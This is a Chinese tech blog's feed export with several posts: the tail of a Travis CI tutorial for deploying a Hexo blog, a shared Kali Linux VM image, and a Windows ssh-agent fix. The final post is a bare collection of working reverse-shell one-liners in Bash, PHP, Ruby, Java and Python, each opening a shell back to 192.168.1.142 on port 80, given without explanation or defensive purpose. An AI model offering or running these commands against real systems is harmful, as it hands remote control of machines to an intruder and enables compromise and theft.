设置相应版本</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="comment"># 安装hexo及插件</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="comment"># 清除</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span> <span class="comment"># 生成</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"yourname"</span> <span class="comment"># 修改name</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"your email"</span> <span class="comment"># 修改email</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span> <span class="comment"># GH_TOKEN是在Travis中配置token的名称</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span> <span class="comment">#只监测hexo分支，hexo是我的分支的名称，可根据自己情况设置</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/yourname/yourname.github.io.git</span> <span class="comment">#设置GH_REF，注意更改yourname</span></span><br></pre></td></tr></table></figure><p>这个是针对 <code>github</code> 仓库的最简版本，不过有个问题，我们从执行的命令中也能看到，就是部署到 <code>master</code> 分支的站点文件每次都会 <code>init</code> 后在提交，所以每次都只有一次 <code>commit</code> 记录，我建议你把下面的看完。</p><p>我先把文件给出来：</p><p><code>.travis.yml</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line"><span class="attr">    apt:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    directories:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">node_modules</span></span><br><span class="line"></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line"><span class="attr">    email:</span></span><br><span class="line"><span class="attr">        recipients:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">akkumans@qq.com</span></span><br><span class="line"><span class="attr">        on_success:</span> <span class="string">change</span></span><br><span class="line"><span class="attr">        on_failure:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">export</span> <span class="string">TZ='Asia/Shanghai'</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="bullet">-g</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line"></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line">        <span class="comment"># Github Pages</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/akkuman/akkuman.github.io.git</span></span><br><span class="line">        <span class="comment"># Coding Pages</span></span><br><span class="line"><span class="attr">        - CD_REF:</span> <span class="string">git.coding.net/Akkuman/Akkuman.git</span></span><br></pre></td></tr></table></figure><p>我把需要执行的脚本放到了 <code>publish-to-gh-pages.sh</code> 文件。</p><p><code>publish-to-gh-pages.sh</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="string">set</span> <span class="bullet">-ev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get clone master</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="attr">https://$&#123;GH_REF&#125;</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">git</span> <span class="string">checkout</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"><span class="string">mv</span> <span class="string">.deploy_git/.git/</span> <span class="string">./public/</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"akkumans@qq.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add commit timestamp</span></span><br><span class="line"><span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder at `date +"</span><span class="string">%Y-%m-%d</span> <span class="string">%H:%M"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Github Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coding Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://Akkuman:$&#123;CODING_TOKEN&#125;@$&#123;CD_REF&#125;"</span> <span class="attr">master:master</span></span><br></pre></td></tr></table></figure><p>请把对应的 <code>Akkuman</code> 和 <code>email</code> 还有 <code>username</code> 改成你的配置。</p><p>这里我不详解配置，因为这篇文章已经花了很长时间了，如果大家有需要我再详细写。下面我会给出我的仓库地址，如果有不懂可以去看看我仓库下的例子。</p><p>说着不详解，但是我还是有点自己踩过的坑需要提点一下，<code>Travis CI</code> 进行 <code>git clone</code> 操作的时候，默认是开启 <code>--recursive</code> 参数的，也就是克隆库的时候会默认初始化子模块。这个操作本来是没问题的，那么我为什么要单独提出来说？</p><p>我上面说到了：</p><blockquote><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响</p></blockquote><p>问题就是这里了，如果你是用的HTTPS协议，根据 <code>.gitmodules</code> 文件默认初始化子模块的时候是没问题。但是如果使用SSH协议，不管是 <code>clone</code>、<code>push</code>还是其他等等操作， 是要求本机上有私钥，并且仓库那边要有对应的公钥才可以。但是<code>Travis CI</code> 自动部署执行 <code>clone</code> 的时候没有这个公私钥，所以我们只能使用HTTPS协议，但是我使用的是 <code>.gitmodules</code> 文件里面定义的子模块SSH协议呀！我在这里也查了一下，解决方案就是上面的那样。节选出来：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br></pre></td></tr></table></figure><p>先关闭了 <code>Travis CI</code> 的默认初始化子模块功能，然后后面我们先判断子模块配置文件是否存在（所以我刚才说最省事的就是使用 <code>releases</code> 主题，也就是不含 <code>.git</code> 文件夹的，具体见上面），然后判断子模块配置文件如果存在存在，就使用 <code>sed</code> 把命令把 <code>.gitmodules</code> 子模块配置文件中的SSH协议换成HTTPS协议再执行后面的操作。</p><h2 id="开启自动构建之旅"><a href="#开启自动构建之旅" class="headerlink" title="开启自动构建之旅"></a>开启自动构建之旅</h2><p>现在你的博客仓库 <code>akkuman.github.io</code> 文件夹下的 <code>hexo</code> 分支下的东西已经配置好了。</p><p>新分支有了，<code>.travis.yml</code> 文件也有了。</p><p>你现在可以直接 <code>push</code> 上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">":constructin_worker: The introduction of Travis CI"</span></span><br><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>然后打开 <code>Travis CI</code> 网站即可看到你的网站正在构建，如果构建失败，上面也有详细的报错可以帮你分析原因。构建成功后即可看到你焕然一新的网站了。</p><p>以后更新 <code>md</code> 就可以用上面的命令 <code>push</code> 到仓库，然后 <code>Travis CI</code> 会自动帮你构建到 <code>master</code> 分支</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>为了以后不用打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>而是直接可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><p>我们可以设置上游分支，如果是第一次执行 <code>git push origin hexo:hexo</code>，它会提示你使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --<span class="built_in">set</span>-upstream origin hexo</span><br></pre></td></tr></table></figure><p>使用上面的命令即可把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支，以后 <code>push</code> 就可以简化命令为 <code>git push</code> 了。</p><p>当然你也可以手动设置上游分支，使用下面的命令把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-upstream-to=origin/hexo hexo</span><br></pre></td></tr></table></figure><h2 id="我的站点仓库配置示例"><a href="#我的站点仓库配置示例" class="headerlink" title="我的站点仓库配置示例"></a>我的站点仓库配置示例</h2><p>见 <a href="https://github.com/akkuman/akkuman.github.io/tree/hexo" target="_blank" rel="noopener">akkuman/akkuman.github.io</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">Hexo + Travis CI 博客管理</a></li><li><a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/#坑3：-travis-CI自动构建部署之后，博客页面空白，什么也没有" target="_blank" rel="noopener">使用Travis CI自动构建hexo博客</a></li><li><a href="http://www.itfanr.cc/2017/08/09/using-travis-ci-automatic-deploy-hexo-blogs/#创建-travis-yml-文件" target="_blank" rel="noopener">使用Travis CI自动部署Hexo博客</a></li><li><a href="https://docs.travis-ci.com/user/languages/r/#configuration-options" target="_blank" rel="noopener">Travis CI官方帮助文档</a></li><li><a href="https://blog.csdn.net/guotianqing/article/details/82391665" target="_blank" rel="noopener">git中submodule子模块的添加、使用和删除</a></li><li><a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></li><li><a href="https://coding.net/help/doc/account/access-token.html" target="_blank" rel="noopener">CODING帮助文档-个人访问令牌</a><blockquote><p>提一句上面的git push –force –quiet “<a href="https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;" target="_blank" rel="noopener">https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;</a> 网址格式是查询的CODING帮助文档</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 &lt;code&gt;git push&lt;/code&gt; 就能生成博客？那我推荐你应该使用使用 &lt;code&gt;Travis CI&lt;/code&gt;了。&lt;/p&gt;
&lt;p&gt;这篇文章我们来讲讲如何利用 &lt;code&gt;Travis CI&lt;/code&gt;把你 &lt;code&gt;push&lt;/code&gt; 上去的博客源文件直接生成可访问的站点，并且同步部署到 &lt;code&gt;github pages&lt;/code&gt; 和 &lt;code&gt;coding pages&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;这篇文章假设你已经对这些采用 &lt;code&gt;git&lt;/code&gt; 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 &lt;code&gt;git&lt;/code&gt; 以及了解 &lt;code&gt;hexo&lt;/code&gt; 写博客发布到这些 &lt;code&gt;pages&lt;/code&gt; 服务的流程。因此本文会写的较为&lt;strong&gt;简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案&lt;/strong&gt;，希望能够帮助到大家。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux Xfce版美化虚拟机镜像</title>
    <link href="http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html"/>
    <id>http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html</id>
    <published>2018-09-04T02:59:43.000Z</published>
    <updated>2019-11-13T05:11:10.976Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。</p><p><code>Kali</code> 一直用的是 <code>xfce</code> 版本，至于为什么用这个版本，是因为我感觉 <code>gnome3</code> 在虚拟机上表现欠佳。当然，默认的 <code>gnome3</code> 看起来还是不错的，而 <code>xfce</code> 默认的就看起来很寒碜了</p><p>默认的 <code>Kali-Xfce</code> 是这个样子的</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxco29z1zj20le0c0146.jpg" alt="原版kali-xfce"></p><p>具体过程不表了，如果有人有需要我再发吧，毕竟这次美化过程没有记录，我也懒得再重操一遍了，直接上美化后的截图吧</p><h2 id="美化截图"><a href="#美化截图" class="headerlink" title="美化截图"></a>美化截图</h2><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxcov30z4j21hc0u07bd.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd0a4t5ej21hc0u0u0x.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd11uu4qj21hc0u0b29.jpg" alt=""></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>注意是64位的镜像，需要cpu虚拟化开启支持</strong></p><p>直接解压然后导入vmware（version &gt;= 10.X）虚拟机即可，默认账户密码为 <code>root:toor</code></p><p>软件源已改为国内的中科大源，不需要自己换</p><h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>已更新到 <code>2018-09-04</code> 最新，如果需要更新可以运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt upadte</span><br><span class="line">apt full-upgrade</span><br></pre></td></tr></table></figure><h3 id="顶栏透明"><a href="#顶栏透明" class="headerlink" title="顶栏透明"></a>顶栏透明</h3><p>图片上的顶栏可以改为透明的，在顶栏上右键然后找到 <code>面板首选项 -&gt; 外观 -&gt; alpha</code> 改为 <code>0</code> ，顶栏可透明</p><h3 id="更新vmtool"><a href="#更新vmtool" class="headerlink" title="更新vmtool"></a>更新vmtool</h3><p>打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>如果有新版本vmtool会提示更新</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大小: 3649679846 字节</span><br><span class="line">修改时间: 2018年9月4日, 11:18:46</span><br><span class="line">MD5: EDC1BF26205D06EA668F8EA03A05D456</span><br><span class="line">SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA</span><br><span class="line">CRC32: A51255F0</span><br></pre></td></tr></table></figure><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><ul><li><a href="https://pan.baidu.com/s/1Neyff9GpVm08w5A6lesmQQ" target="_blank" rel="noopener">百度网盘 | 密码: jcus</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Kali&lt;/code&gt; 一直用的是 &lt;code&gt;xfce&lt;/code&gt; 版本，至于为什么用这个版本，是因为我感觉 &lt;code&gt;gnome3&lt;/code&gt; 在虚拟机上表现欠佳。当然，默认的 &lt;code&gt;gnome3&lt;/code&gt; 看起来还是不错的，而 &lt;code&gt;xfce&lt;/code&gt; 默认的就看起来很寒碜了&lt;/p&gt;
&lt;p&gt;默认的 &lt;code&gt;Kali-Xfce&lt;/code&gt; 是这个样子的&lt;/p&gt;
    
    </summary>
    
      <category term="Kali" scheme="http://hacktech.cn/categories/Kali/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="Kali" scheme="http://hacktech.cn/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
    <link href="http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html"/>
    <id>http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</id>
    <published>2018-09-01T08:26:11.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<p>PowerShell安装了pshazz或者posh-git，但是打开的时候提示 <code>unable to start ssh-agent service, error :1058</code>  </p><a id="more"></a><p>1803的设置上面可以看到这个版本是默认带了openssh客户端的，我们不需要另外去安装，但是命令行运行 <code>ssh-agent</code> 依然是显示 <code>unable to start ssh-agent service, error :1058</code>  </p><p>既然有这个东西，但是服务启动失败，那我们看看本地服务，果然，在本地服务中禁用了，我们改成手动或者自动就能解决这个问题了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PowerShell安装了pshazz或者posh-git，但是打开的时候提示 &lt;code&gt;unable to start ssh-agent service, error :1058&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
      <category term="Win10" scheme="http://hacktech.cn/tags/Win10/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell以及端口转发的方法收集</title>
    <link href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
    <id>http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html</id>
    <published>2018-08-23T08:03:29.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r ‘$sock=fsockopen(“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>);exec(“/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>”);’</span><br><span class="line">(Assumes TCP uses file descriptor <span class="number">3.</span> <span class="keyword">If</span> it doesn’t work, <span class="keyword">try</span> <span class="number">4</span>,<span class="number">5</span>, <span class="keyword">or</span> <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h2 id="RUBY"><a href="#RUBY" class="headerlink" title="RUBY"></a>RUBY</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e’f=TCPSocket.open(“<span class="number">192.168</span>.<span class="number">1.142</span>”,<span class="number">80</span>).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d <span class="number">2</span>&gt;&amp;%d”,f,f,f)’</span><br></pre></td></tr></table></figure><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([“/bin/bash”,”-c”,”exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.1.142/<span class="number">80</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> \$line <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done”] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c ‘<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/80 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
